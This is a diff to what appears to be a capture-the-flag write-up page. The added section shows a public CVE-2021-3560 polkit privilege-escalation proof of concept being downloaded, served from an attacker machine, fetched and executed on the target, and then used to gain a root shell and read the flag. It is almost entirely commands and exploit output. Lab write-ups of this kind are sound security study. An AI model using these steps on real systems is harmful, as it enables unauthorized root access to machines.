@@ -1,5 +1,7 @@
 ---
 icon: desktop
+hidden: true
+noIndex: true
 layout:
   title:
     visible: true
@@ -455,53 +457,70 @@ Sudoers I/O plugin version 1.8.29
 
 
 
+```bash
+❯ wget https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/refs/heads/main/poc.sh
+--2025-02-19 08:26:56--  https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/refs/heads/main/poc.sh
+Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.111.133, ...
+Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 9627 (9,4K) [text/plain]
+Grabando a: «poc.sh»
+
+poc.sh                                                    100%[==================================================================================================================================>]   9,40K  --.-KB/s    en 0s      
+
+2025-02-19 08:26:56 (70,8 MB/s) - «poc.sh» guardado [9627/9627]
+
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+```
 
 
 
+```bash
+[dwight@paper tmp]$ wget 10.10.16.3/poc.sh; chmod +x poc.sh
+--2025-02-18 18:50:39--  http://10.10.16.3/poc.sh
+Connecting to 10.10.16.3:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 9627 (9.4K) [text/x-sh]
+Saving to: 'poc.sh'
+
+poc.sh                                                    100%[==================================================================================================================================>]   9.40K  --.-KB/s    in 0.02s   
+
+2025-02-18 18:50:39 (463 KB/s) - 'poc.sh' saved [9627/9627]
+```
 
 
 
+```bash
+[dwight@paper tmp]$ ./poc.sh 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+[!] Username set as : secnigma
+[!] No Custom Timing specified.
+[!] Timing will be detected Automatically
+[!] Force flag not set.
+[!] Vulnerability checking is ENABLED!
+[!] Starting Vulnerability Checks...
+[!] Checking distribution...
+[!] Detected Linux distribution as "centos"
+[!] Checking if Accountsservice and Gnome-Control-Center is installed
+[+] Accounts service and Gnome-Control-Center Installation Found!!
+[!] Checking if polkit version is vulnerable
+[+] Polkit version appears to be vulnerable!!
+[!] Starting exploit...
+[!] Inserting Username secnigma...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+[+] Inserted Username secnigma  with UID 1005!
+[!] Inserting password hash...
+[!] It looks like the password insertion was succesful!
+[!] Try to login as the injected user using su - secnigma
+[!] When prompted for password, enter your password 
+[!] If the username is inserted, but the login fails; try running the exploit again.
+[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
+[dwight@paper tmp]$ su secnigma
+Password: 
+[secnigma@paper tmp]$ sudo bash
+[sudo] password for secnigma: 
+[root@paper tmp]# cat /root/root.txt 
+22ed53fa20fe333a8534b165c8e10a1
+```
